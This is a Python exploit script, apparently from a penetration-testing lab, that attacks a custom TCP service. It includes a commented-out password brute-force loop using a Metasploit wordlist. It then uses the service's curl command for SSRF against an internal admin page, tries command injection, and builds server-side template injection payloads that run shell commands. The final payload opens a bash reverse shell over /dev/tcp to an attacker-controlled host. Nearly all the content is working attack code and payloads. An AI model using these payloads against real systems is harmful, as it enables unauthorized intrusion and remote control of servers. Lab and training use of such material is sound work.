#!/usr/bin/python3

import socket

HOST="192.168.188.112"
PORT=50000

s = None
def connect():
	global s
	s = socket.socket()
	s.connect((HOST,PORT))

username = b"bob"
password = b"[REDACTED]"

# Example:
# 1\x00admin\x00password\x00
def login():
	connect()
	buf = b""
	buf += b"1"
	buf += b"\x00"
	buf += username
	buf += b"\x00"
	buf += password
	buf += b"\x00"

	s.send(buf)
	r = s.recv(4096)
	data = r.split(b"\x00")

	print(data)	
	
	s.close()
	if int(data[0]) == 1:
		return data[1].decode()
	else:
		return None

# Example:
# 2\x00commands\x00
def send_command(uuid, cmd, *args):
	connect()
	buf = b""
	buf += b"2"
	buf += b"\x00"
	buf += uuid.encode()
	buf += b"\x00"
	buf += cmd.encode()
	buf += b"\x00"
	if args != ():
		for x in args:
			buf += x.encode()
			buf += b"\x00"

	s.send(buf)
	r = s.recv(25600)
	data = r.split(b"\x00")
	
	print(data)

	s.close()
	if int(data[0]) == 1:
		return data[1].decode()
	else:
		return None

#TODO program some of the example functions that we can show to the client

# do it step by step, the code seems a little complicated, lets verbose it and see some of the output

# play with the commands using the hints in the comments

# for login() we get invalid password and for send_command("2", "whoami") invalid uuid and invalid commands

# start by logging in first and maybe we can get a uuid?

"""
passwords = (p.strip() for p in open("/usr/share/wordlists/metasploit/unix_passwords.txt", "rb").readlines())
for p in passwords:
	password = p
	if login():
		print("Password found {}".format(password))
"""


password = b"cookie1"
uuid = login()
send_command(uuid, "commands")

"""
Realise that when I try to curl XXXXXXXXX, throws error, maybe we need to set it as a separate argument as the function does have *args
"""

send_command(uuid, "curl", "http://192.168.49.188/")

"""
https://www.dcode.fr/cipher-identifier tells me that the cipher is base64
"""

import base64

command = send_command(uuid, "curl", "http://192.168.49.188/")
command = base64.b64decode(command)
print(command)

"""
Can't do code injection, but what about some SSRF and SSTI vulnerability?

https://stackoverflow.com/questions/6150108/how-to-pretty-print-html-to-a-file-with-indentation
https://www.urlencoder.org/
"""

from bs4 import BeautifulSoup

command = send_command(uuid, "curl", "http://127.0.0.1:8080")
command = base64.b64decode(command)
print(BeautifulSoup(command.decode(), 'html.parser').prettify())

"""
<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<title>Internal Admin Echo Test</title>\n\t</head>\n\t<body>\n\t\t<form action="/" method="get">\n\t\t\t<input type="text" name="echostr" value="Hello World!">\n\t\t\t<input type="submit" value="Submit">\n\t\t</form>\n\t</body>\n</html>\n\n

Realise that form is using GET parameter, not POST... maybe try and to run some commands?
"""

command = send_command(uuid, "curl", "http://127.0.0.1:8080?echostr=whoami")
command = base64.b64decode(command)
print(BeautifulSoup(command.decode(), 'html.parser').prettify())

"""
Try and do command injection but fail again
"""

command = send_command(uuid, "curl", "http://127.0.0.1:8080?echostr=whoami%26%20curl%20http%3A%2F%2F192.168.49.188%3A81")
command = base64.b64decode(command)
print(BeautifulSoup(command.decode(), 'html.parser').prettify())

"""
What about SSTI?
"""

command = send_command(uuid, "curl", "http://127.0.0.1:8080?echostr=%7B%7B7%2A7%7D%7D")
command = base64.b64decode(command)
print(BeautifulSoup(command.decode(), 'html.parser').prettify())

command = send_command(uuid, "curl", "http://127.0.0.1:8080?echostr=%7B%7Bconfig%7D%7D")
command = base64.b64decode(command)
print(BeautifulSoup(command.decode(), 'html.parser').prettify())

command = send_command(uuid, "curl", "http://127.0.0.1:8080?echostr=%7B%7B%7B%7D.__class__.__base__.__subclasses__%28%29%5B400%5D%28%22id%22%2C%20shell%3DTrue%2C%20stdout%3D-1%29.communicate%28%29%5B0%5D.decode%28%29%7D%7D")
command = base64.b64decode(command)
print(BeautifulSoup(command.decode(), 'html.parser').prettify())

command = send_command(uuid, "curl", "http://127.0.0.1:8080?echostr=%7B%7B%7B%7D.__class__.__base__.__subclasses__%28%29%5B400%5D%28%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.188%2F81%200%3E%261%0A%27%20%22%2C%20shell%3DTrue%2C%20stdout%3D-1%29.communicate%28%29%5B0%5D.decode%28%29%7D%7D")
command = base64.b64decode(command)
print(BeautifulSoup(command.decode(), 'html.parser').prettify())

